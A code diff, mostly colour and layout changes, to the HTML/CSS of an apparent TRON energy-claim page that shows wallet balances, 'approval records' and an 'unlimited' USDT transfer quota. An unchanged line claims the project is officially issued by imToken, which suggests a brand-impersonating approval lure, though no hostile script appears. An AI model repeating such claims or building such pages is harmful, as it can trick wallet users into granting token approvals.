@@ -174,8 +174,7 @@ body {
 }
 /* ========== 修改userInfo样式：四角布局 ========== */
 #userInfo {
-    text-align: center;
-    font-size: 12px; /* 字体调大 */
+    text-align: center;font-size: 12px; /* 字体调大 */
     padding: 20px 12px; /* 扩大内边距，避免四角内容溢出 */
     background: #ffffff; /* 白色背景 */
     border-radius: 8px;
@@ -184,7 +183,7 @@ body {
     min-height: 120px; /* 增大最小高度，容纳四角内容 */
     position: relative; /* 父容器相对定位 */
 }
-/* 四角余额项样式 */
+/* 四角余额项样式：调整标题字体/颜色 */
 .balance-item {
     position: absolute;
     display: flex;
@@ -194,17 +193,22 @@ body {
     font-size: 13px;
     color: #000000;
 }
+/* 余额标题（USDT/TRX/能量/宽带）：调大+蓝色 */
+.balance-item > span:first-child {
+    font-size: 15px; /* 比数值大1px */
+    color: #165DFF; /* 蓝色 */
+}
+/* 余额数值：绿色 */
+.balance-value {
+    color: #10B981; /* 绿色数值 */
+    font-size: 16px;
+    font-weight: 600;
+}
 /* 四角定位 */
 .balance-usdt { top: 10px; left: 40px; }
 .balance-trx { top: 10px; right: 40px; }
 .balance-energy { bottom: 10px; left: 40px; }
 .balance-bandwidth { bottom: 10px; right: 40px; }
-/* 余额数值强调 */
-.balance-value {
-    color: #ef4444; /* 浅红色数值 */
-    font-size: 16px;
-    font-weight: 600;
-}
 /* 未连接状态提示（居中） */
 #userInfoDefault {
     position: absolute;
@@ -231,11 +235,14 @@ body {
 }
 #walletStatusContainer .status-title {
     font-size: 14px; /* 字体调大 */
-    color: #000000; /* 黑色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
     gap: 6px;
+}
+/* 钱包状态标题：蓝色 */
+#walletStatusTitle {
+    color: #165DFF; /* 蓝色标题 */
 }
 #walletStatusContainer .connected-content {
     display: none;
@@ -247,8 +254,9 @@ body {
 #walletStatusContainer.connected .connected-content {
     display: block;
 }
+/* 钱包状态显示值：绿色 */
 #walletStatusContainer .highlight {
-    color: #ef4444; /* 浅红色强调 */
+    color: #10B981; /* 绿色强调 */
     font-weight: 500;
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
@@ -270,18 +278,22 @@ body {
 }
 #contractResourceContainer .status-title {
     font-size: 14px; /* 字体调大 */
-    color: #000000; /* 黑色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
     gap: 4px;
 }
+/* 合约资源标题：蓝色 */
+#contractResourceTitle {
+    color: #165DFF; /* 蓝色标题 */
+}
 #contractResourceContainer .status-title i {
     font-size: 16px; /* 字体调大 */
     color: #ef4444; /* 浅红色图标 */
 }
+/* 合约资源显示值：绿色 */
 #contractResourceContainer .highlight {
-    color: #ef4444; /* 浅红色强调 */
+    color: #10B981; /* 绿色强调 */
     font-weight: 500;
 }
 #contractResourceContainer .data-tag {
@@ -328,8 +340,7 @@ body {
 }
 .record-item {
     margin-bottom: 10px;
-    padding-bottom: 10px;
-    border-bottom: 1px solid #fca5a5; /* 浅红色边框 */
+    padding-bottom: 10px;border-bottom: 1px solid #fca5a5; /* 浅红色边框 */
 }
 .record-item:hover {
     border-color: #ef4444; /* 浅红色边框 */
@@ -342,8 +353,16 @@ body {
     font-size: 13px; /* 字体调大 */
 }
 .record-item p strong {
-    color: #ef4444; /* 浅红色强调 */
+    color: #10B981; /* 绿色强调（原红色改为绿色） */
     margin-right: 5px;
+}
+/* 授权记录文本：绿色 */
+#approvalRecords {
+    color: #10B981; /* 绿色（原红色改为绿色） */
+}
+/* “USDT转账”“无限”：蓝色 */
+#energyType, #transferQuota {
+    color: #165DFF; /* 蓝色 */
 }
 .tx-link {
     color: #ef4444; /* 浅红色链接 */
@@ -508,8 +527,7 @@ body {
             <div class="inner one"></div>
             <div class="inner two"></div>
             <div class="inner three"></div>
-        </div>
-    </div>
+        </div></div>
 
     <div class="container">      
         <div class="header-container">
@@ -585,8 +603,7 @@ body {
             </div>
             <div class="resource-content" style="line-height: 1.8;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
-                <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span>μs</p>
-                <p style="font-size: 12px; color: #000000; margin-top: 5px;" id="contractNote">
+                <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span>μs</p><p style="font-size: 12px; color: #000000; margin-top: 5px;" id="contractNote">
                     注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
             </div>
